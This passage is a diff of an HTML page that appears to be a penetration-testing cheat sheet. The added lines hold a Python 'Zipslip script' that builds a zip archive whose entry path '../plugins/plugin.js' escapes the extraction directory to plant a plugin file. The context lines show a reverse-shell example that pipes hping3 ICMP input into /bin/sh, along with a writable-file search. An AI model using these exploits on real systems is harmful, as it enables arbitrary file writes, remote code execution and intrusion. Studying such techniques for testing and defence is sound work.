@@ -398,6 +398,22 @@ find<span class="w"> </span>/<span class="w"> </span>-writable<span class="w"> <
 <p>Use pdb debugger (<a href="https://docs.python.org/3/library/pdb.html">pdb</a>):</p>
 <div class="highlight"><pre><span></span><code>python -m pdb myscript.py
 </code></pre></div>
+<p>Zipslip script:</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">io</span>
+<span class="kn">import</span> <span class="nn">zipfile</span>
+
+<span class="n">zip_buffer</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">()</span>
+<span class="n">trav</span> <span class="o">=</span> <span class="s2">"../plugins/"</span>
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'plugin.js'</span><span class="p">,</span> <span class="s1">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="k">with</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="n">zip_buffer</span><span class="p">,</span> <span class="s1">'w'</span><span class="p">,</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZIP_DEFLATED</span><span class="p">)</span> <span class="k">as</span> <span class="n">zip_file</span><span class="p">:</span>
+        <span class="n">zip_file</span><span class="o">.</span><span class="n">writestr</span><span class="p">(</span><span class="n">trav</span><span class="o">+</span><span class="s1">'plugin.js'</span><span class="p">,</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()))</span>
+
+    <span class="n">output</span> <span class="o">=</span> <span class="n">zip_buffer</span><span class="o">.</span><span class="n">getvalue</span><span class="p">()</span>
+
+
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'output.zip'</span><span class="p">,</span> <span class="s1">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+ <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
+</code></pre></div>
 <h2 id="reverse-shells">Reverse Shells</h2>
 <p>Reverse shell though <code>hping3</code>:</p>
 <div class="highlight"><pre><span></span><code><span class="n">Server</span><span class="p">:</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">hping3</span><span class="w"> </span><span class="o">--</span><span class="n">icmp</span><span class="w"> </span><span class="o">--</span><span class="n">listen</span><span class="w"> </span><span class="n">test</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="mi">1234</span><span class="w"> </span><span class="mf">192.168</span><span class="o">.</span><span class="mf">56.108</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span>
